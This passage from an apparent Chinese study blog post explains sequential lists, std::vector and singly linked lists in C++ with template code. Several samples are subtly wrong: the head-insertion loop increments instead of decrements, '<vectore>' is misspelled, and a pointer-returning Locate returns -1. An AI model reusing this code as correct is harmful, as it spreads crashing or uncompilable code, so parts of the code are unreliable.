class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="顺序表的应用">顺序表的应用</h2>
<p>​
模板类SeqList中的形式化参数T，在实例化时可以用任何的数据类型来替换。</p>
<p>SeqList.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">SeqList</span>() &#123; length = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="built_in">SeqList</span>(T a[], <span class="type">int</span> n);</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetLength</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> length; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, T x)</span></span>;</span><br><span class="line">    <span class="function">T <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    <span class="function">T <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(T x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T data[N];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line">SeqList&lt;T, N&gt;::<span class="built_in">SeqList</span>(T a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; N)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;数组超出顺序表最大长度&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    length = n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">void</span> SeqList&lt;T, N&gt;::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i].<span class="built_in">print</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">void</span> SeqList&lt;T, N&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i, T x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (length &gt;= N)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;上溢异常&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; length + <span class="number">1</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;位置异常&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = length; j &gt;= i; j--)</span><br><span class="line">        data[j] = data[j - <span class="number">1</span>];</span><br><span class="line">    data[i - <span class="number">1</span>] = x;</span><br><span class="line">    length++;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line">T SeqList&lt;T,N&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (length == <span class="number">0</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;下溢错误&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; length)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;位置错误&quot;</span>;</span><br><span class="line">    T x = data[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; length; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[j - <span class="number">1</span>] = data[j];</span><br><span class="line">    &#125;</span><br><span class="line">    length--;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line">T SeqList&lt;T, N&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i) <span class="comment">// 获取线性表第i个位置的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; length)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;查找位置非法&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> data[i - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">int</span> SeqList&lt;T, N&gt;::<span class="built_in">Locate</span>(T x) <span class="comment">// 查找线性表中值为x的元素，找到后返回其位置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[i] == x)</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 查找失败</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>PHONEBOOK.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PHONEBOOK</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_ID;</span><br><span class="line">    std::string m_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>(<span class="type">int</span> id, <span class="type">char</span> *name)</span><br><span class="line">    &#123;</span><br><span class="line">        m_ID = id;</span><br><span class="line">        m_name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; m_ID &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; m_name &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(PHONEBOOK &amp;p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p.m_ID == m_ID)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>主程序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PHONEBOOK.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Seqlist.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHONEBOOK pbook[<span class="number">2</span>] = &#123;&#123;<span class="number">20181208</span>, <span class="string">&quot;Mary&quot;</span>&#125;, &#123;<span class="number">20181127</span>, <span class="string">&quot;Tom&quot;</span>&#125;&#125;;</span><br><span class="line">    <span class="function">PHONEBOOK <span class="title">record</span><span class="params">(<span class="number">20181209</span>, <span class="string">&quot;Phoenix&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">SeqList&lt;PHONEBOOK, 100&gt; <span class="title">list</span><span class="params">(pbook, <span class="number">2</span>)</span></span>;</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    list.<span class="built_in">Insert</span>(<span class="number">1</span>, record);</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    PHONEBOOK x = list.<span class="built_in">Delete</span>(<span class="number">3</span>);</span><br><span class="line">    x.<span class="built_in">print</span>();</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    <span class="type">int</span> p = list.<span class="built_in">Locate</span>(record);</span><br><span class="line">    cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stl中的顺序表">STL中的顺序表</h2>
<p>​
向量(vector)就是使用顺序结构存储实现的模板类，即内部使用数组来实现的模板类，因此vector具有顺序表的所有特点</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">方法名</th>
<th style="text-align: center;">方法描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">back()</td>
<td style="text-align: center;">返回最后一个向量的值</td>
</tr>
<tr class="even">
<td style="text-align: center;">begin()</td>
<td style="text-align: center;">返回指向第一个元素的迭代器</td>
</tr>
<tr class="odd">
<td style="text-align: center;">capacity()</td>
<td style="text-align: center;">返回容量</td>
</tr>
<tr class="even">
<td style="text-align: center;">clear()</td>
<td style="text-align: center;">将容器清空</td>
</tr>
<tr class="odd">
<td style="text-align: center;">empty()</td>
<td
style="text-align: center;">若大小为0，则返回true；否则返回false</td>
</tr>
<tr class="even">
<td style="text-align: center;">end()</td>
<td style="text-align: center;">返回指向最后一个容器的迭代器</td>
</tr>
<tr class="odd">
<td style="text-align: center;">erase()</td>
<td style="text-align: center;">在向量的任意位置删除元素</td>
</tr>
<tr class="even">
<td style="text-align: center;">insert()</td>
<td style="text-align: center;">在向量的任意位置插入元素</td>
</tr>
<tr class="odd">
<td style="text-align: center;">pop_back()</td>
<td style="text-align: center;">删除最后一个元素</td>
</tr>
<tr class="even">
<td style="text-align: center;">push_back()</td>
<td style="text-align: center;">在向量的尾部添加元素</td>
</tr>
<tr class="odd">
<td style="text-align: center;">resize()</td>
<td style="text-align: center;">改变容量</td>
</tr>
<tr class="even">
<td style="text-align: center;">size()</td>
<td style="text-align: center;">返回向量中的元素个数</td>
</tr>
</tbody>
</table>
<p>​ 在使用vector之前，需要包含相应的头文件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vectore&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;ivec;<span class="comment">//定义向量对象ivec，向量中每一个元素都是int类型</span></span><br><span class="line">vector&lt;PHONEBOOK&gt;vec;<span class="comment">//定义向量对象vec，向量中每一个元素都是PHONEBOOK类型</span></span><br></pre></td></tr></table></figure>
<p>​
vector在实例化时不需要声明长度。标准库负责管理与存储元素相关的内存，用户不用担心内存不够。</p>
<p>​ 为了防止访问时地址越界，一般使用迭代器</p>
<p>​ 定义迭代器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;PHONEBOOK&gt;::iterator it;</span><br></pre></td></tr></table></figure>
<p>​ 迭代器类似于指针，可以使用*it
来访问相应元素。如it=vec.begin()表示迭代器it指向vec的第一个元素；it=vec.end()表示迭代器指向vec的最后一个元素。</p>
<p>​
vector容器是自动增长的，随着数据元素的增多，vector能自动申请内存（自动扩容）</p>
<h2 id="单链表的实现">单链表的实现</h2>
<p>​ 动画理解链表</p>
<p>​
顺序表利用<strong>物理位置上的相邻关系</strong>来表示数据元素之间的逻辑关系，这一特点使得存储结构具有以下优缺点：</p>
<p>优点：</p>
<ul>
<li>不需要为表示元素之间的逻辑关系而增加额外的存储空间</li>
<li>可以方便地随机访问顺序表中任一位置的元素</li>
</ul>
<p>缺点：</p>
<ul>
<li>插入和删除操作需移动大量的数据元素，效率较低；在等概率的情况下，两种操作平均需要移动顺序表中约一半的元素</li>
<li>顺序表难以选择合适的存储容量。顺序表要求占用连续的存储空间，存储分配只能预先进行，因此属于静态存储分配方式，若开始时分配的空间过小，则插入操作很容易引起顺序表的溢出，若开始时分配的空间过大，则可能造成一部分的空间长期空置，不能被充分利用。</li>
</ul>
<p>​
为了克服顺序表的缺点，可以采用链式存储方式存储线性表，最简单的链式存储方式就是单链表，这种方法采用动态存储分配方式，即根据实际需要随时申请内存，在不需要时将内存释放。</p>
<h3 id="单链表的存储结构">单链表的存储结构</h3>
<p>​
单链表由一个一个结点通过结点的指针(pointer)或链(link)按照元素逻辑顺序链接而成，因此，单链表的每一个结点都由数据域(data)和指针域(next)两部分构成，data域用来存储元素的值，next域用来存储直接后继的地址或位置。</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230227105936583.png" /></p>
<p>​
由于结点的数据类型不确定，因此可以采用模板机制，使用结构类型或类来描述单链表的结点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    T data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&lt;T&gt; * next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
单链表除第一个结点外，其他每个结点的地址都存储在前一个结点的next域中，因此，只要取得第一个结点的地址，就能顺序遍历单链表的所有结点，因此头指针具有标识一个单链表的功能。</p>
<p>​
对于不带头节点的单链表，若表为空则头指针值为NULL；若表不为空，头指针存储第一个结点的地址。实际操作下，由于不能确定表是否为空，因此处理头指针时往往需要按两种情况分开讨论。</p>
<p>​
需要修改头指针和不需要修改头指针。使用头指针时，插入删除首结点与修改其他结点的操作不同。</p>
<p>​
so，为了统一处理上述情况，通常在单链表的开始结点之前附设一个类型相同的结点，称为头结点(head
node)。头节点虽然增加了一点内存开销，却使得单链表的很多操作实现起来更加方便。头节点的地址保存在头指针中。</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230227111125202.png" /></p>
<p>​</p>
<p>​ 下面给出C++描述的单链表模板类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">LinkList</span>()&#123;front =<span class="keyword">new</span> Node&lt;T&gt;;front-&gt;next=<span class="literal">NULL</span>;&#125;<span class="comment">//无参构造函数</span></span><br><span class="line">    	<span class="built_in">LinkList</span>(T a[],<span class="type">int</span> n);<span class="comment">//有参构造函数</span></span><br><span class="line">    	~<span class="built_in">LinkList</span>();<span class="comment">//析构函数</span></span><br><span class="line">    	<span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="type">int</span> <span class="title">GetLength</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function">Node&lt;T&gt; * <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;<span class="comment">//获取线性表第i个位置上的元素结点地址</span></span><br><span class="line">    	<span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(T x)</span></span>;</span><br><span class="line">    	<span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i,T x)</span></span>;<span class="comment">//在线性表的第i个位置插入值为x的新元素</span></span><br><span class="line">    	<span class="function">T <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;<span class="comment">//删除线性表的第i个元素，并将该元素返回</span></span><br><span class="line">    <span class="keyword">private</span>：</span><br><span class="line">        Node&lt;T&gt; * front;<span class="comment">//头指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​
在单链表模板类中，结点类型Node已经在前面给出，私有成员front为头指针，用于存储头结点的地址。</p>
<h3 id="单链表的基本运算">单链表的基本运算</h3>
<h4 id="构造函数">构造函数</h4>
<p>​
如果建立空单链表，只需要建立头结点，在单链表模板类中已经给出了无参构造函数的实现，</p>
<p>​ 建立单链表的方法有两种，分别为头插法和尾插法</p>
<p>头插法：</p>
<p>​
每次插入元素都从单链表的第一个结点位置插入，先前插入的结点随着新节点的插入而不断后移，因此，若希望数组a中各个元素插入后在单链表后的次序依然为a[0],a[1],...,a[n-1]，则插入时应先插入a[n-1]，再插入a[n-2]，依次类推，最后插入a[0]。</p>
<p>​
头插法的执行过程如图所示，无论是插入第一个结点还是插入第k个结点，操作都分为4个步骤，3和4不能互换</p>
<ol type="1">
<li><p>在堆中建立新结点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Node&lt;T&gt; * s=<span class="keyword">new</span> Node&lt;T&gt;;</span><br></pre></td></tr></table></figure></li>
<li><p>将a[i]写入新结点的数据域：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s-&gt;data=a[i];</span><br></pre></td></tr></table></figure></li>
<li><p>修改新结点的指针域</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s-&gt;next=front-&gt;next;</span><br></pre></td></tr></table></figure></li>
<li><p>修改头结点的指针域，将新结点加入链表中</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">front-&gt;next=s;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230227114905323.png" /></p>
<p>​
带头结点的单链表对于所有的结点的操作都是相同的，而不带头结点的单链表则需要判断。</p>
<p>​ 算法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">LinkList&lt;T&gt;::<span class="built_in">LinkList</span>(T a[],<span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    front=<span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node&lt;T&gt; * s=<span class="keyword">new</span> Node&lt;T&gt;;<span class="comment">//建立新结点</span></span><br><span class="line">        s-&gt;data=a[i];<span class="comment">//将a[i]写入新结点的数据域</span></span><br><span class="line">        s-&gt;next=front-&gt;next;<span class="comment">//修改新结点的的指针域</span></span><br><span class="line">        front-&gt;next=s;<span class="comment">//修改头结点的指针域，将新结点加入到链表当中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 显然，时间复杂度为O(n)</p>
<p>尾插法：</p>
<p>​
通常尾插法需要一个指针变量保存终端结点的地址，称为尾指针，设为r，每插入一个新结点后，r指向新插入的终端结点。</p>
<p>​ 步骤如下</p>
<ol type="1">
<li><p>在堆中建立新结点；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Node&lt;T&gt; *s=<span class="keyword">new</span> Node&lt;T&gt;;</span><br></pre></td></tr></table></figure></li>
<li><p>将a[i]写入新结点的数据域；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s-&gt;data=a[i];</span><br></pre></td></tr></table></figure></li>
<li><p>将新结点加入链表中；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">r-&gt;next=s;</span><br></pre></td></tr></table></figure></li>
<li><p>修改尾指针；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">r=s;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>​ 需要注意的是，全部结点插入后，需要将终端结点的指针域设为空。</p>
<p>​ 算法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">LinkList&lt;T&gt;::<span class="built_in">LinkList</span>(T a[],<span class="type">int</span> n)<span class="comment">//尾插法建立链表</span></span><br><span class="line">&#123;</span><br><span class="line">    front = <span class="keyword">new</span> Node &lt;T&gt;;</span><br><span class="line">    Node &lt;T&gt; *r =front;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node &lt;T&gt; *s =<span class="keyword">new</span> Node &lt;T&gt;;</span><br><span class="line">        s-&gt;data=a[i];</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 显然算法的时间复杂度为O(n)</p>
<h4 id="析构函数">析构函数</h4>
<p>​
各个结点都是采用操作符new动态申请的，因此在单链表对象生命周期结束时，需要将这些结点释放。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">LinkList&lt;T&gt;::~<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node &lt;T&gt; * p=front;<span class="comment">//初始化工作指针p</span></span><br><span class="line">    <span class="keyword">while</span>(p)<span class="comment">//要释放的结点存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        front=p;<span class="comment">//暂存要释放的结点</span></span><br><span class="line">        p=p-&gt;next;<span class="comment">//移动工作指针</span></span><br><span class="line">        <span class="keyword">delete</span> front;<span class="comment">//释放结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
若链表长度为n，则包括头结点在内需要进行n+1次循环释放结点空间，所以析构函数的时间复杂度为O(n);</p>
<h4 id="查找算法">查找算法</h4>
<h5 id="按位查找-1">按位查找</h5>
<p>​
链表是一种顺序存储结构，只能从链表的表头出发，顺着每个结点的指针域往后依次访问每个结点。</p>
<p>​ 设单链表的长度为n，要查找表中的第i个元素，则i应满足<span
class="math inline">\(1\leq i\leq
n\)</span>。设工作指针为p，当开始查找时，p指向第一个结点，用整型变量j作计数器，初始时j=1。p每指向下一个结点，j进行加1操作，直到j等于i，此时p的结点（有时简称p结点）就是要找的结点；或者j不等于i但p已经为空，此时说明i是不合法的，算法可抛出异常或返回错误标识。在实现时，可直接返回p，因为若p为空，说明第i个元素不存在，返回空地址；否则，p指向的元素就是要找到，返回元素地址。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230305224122086.png" /></p>
<p>伪代码</p>
<blockquote>
<p>[1]初始化工作指针p和计数器j，p指向第一个结点，j=1；</p>
<p>[2]循环以下操作；</p>
<p>​ [2.1]p指向下一个结点；</p>
<p>​ [2.2]j+1；</p>
<p>[3]返回p</p>
</blockquote>
<p>实现代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Node &lt;T&gt; * LinkList&lt;T&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i)<span class="comment">//获取线性表第i个位置的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    Node &lt;T&gt; *p=front-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j!=i)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p—&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
算法中p=p-&gt;next；是其中一条基本语句，该语句的执行次数玉被查找结点在单链表中的位置有关。在查找超过的情况下，查找位置i满足<span
class="math inline">\(1\leq i \leq
n\)</span>，则基本语句的执行次数为i-1，假定查找每个结点的概率相同(p<sub>i</sub>=1/n)，则查找成功的平均时间复杂度为
<span class="math display">\[
T(n)=\sum_{i=1}^np_i\times (i-1)=\frac1n
\sum_{i=1}^n(i-1)=\frac{n-1}{2}=O(n)
\]</span> ​ 查找不成功的时间复杂度为O(n);</p>
<h5 id="按值查找-1">按值查找</h5>
<p>​ 按值查找是在单链表中查找给定值的结点，找到后返回元素地址或序号。</p>
<p>​ 返回序号：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">int</span> LinkList&lt;T&gt;::<span class="built_in">Locate</span>(T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node &lt;T&gt; *p=front-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==x)<span class="keyword">return</span> j;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 返回元素地址：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Node &lt;T&gt; * LinkList&lt;T&gt;::<span class="built_in">Locate</span>(T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node &lt;T&gt; *p=front-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==x)<span class="keyword">return</span> p;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="插入操作-1">插入操作</h4>
<p>​ 在链表的第i个位置插入值为x的元素，共分为两步：</p>
<ol type="1">
<li>查找到位置为i-1的元素</li>
<li>在该元素后插入新元素</li>
</ol>
<p>​ 算法实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i,T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node &lt;T&gt; *p=front;</span><br><span class="line">    <span class="keyword">if</span>(i!=<span class="number">1</span>)p=<span class="built_in">Get</span>(i<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        Node &lt;T&gt; *s=<span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        s-&gt;data=x;</span><br><span class="line">        s-&gt;next=p-&gt;next;</span><br><span class="line">        p-&gt;next=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">throw</span><span class="string">&quot;插入位置错误&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 平均时间复杂度与按位查找的时间复杂度相同为O(n);</p>
<p>​ 还有一类插入操作是在给定元素的前或后进行插入。</p>
<p>​
如果插入位置的前一个元素的地址已知，设为p，则只需要在p所指元素后插入一个新结点，时间复杂度为O(1)，这种操作称为<strong>后插操作</strong>。</p>
<p>​
如果p指向待插入的元素，则新元素实际插入p所指元素的前一个元素，这种操作称为<strong>前插</strong>。</p>
<p>​
如果为了找到p所指结点的前一个结点，需要从第一个元素开始遍历，时间复杂度为O(n)，实际可以改造算法，使其时间复杂度为O(1)</p>
<p>​
改进方法的思想是：在p结点后插入新结点，让新结点的数据域存储原来p结点的数据域，而p结点的数据域存储新插入的值。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230305230205366.png" /></p>
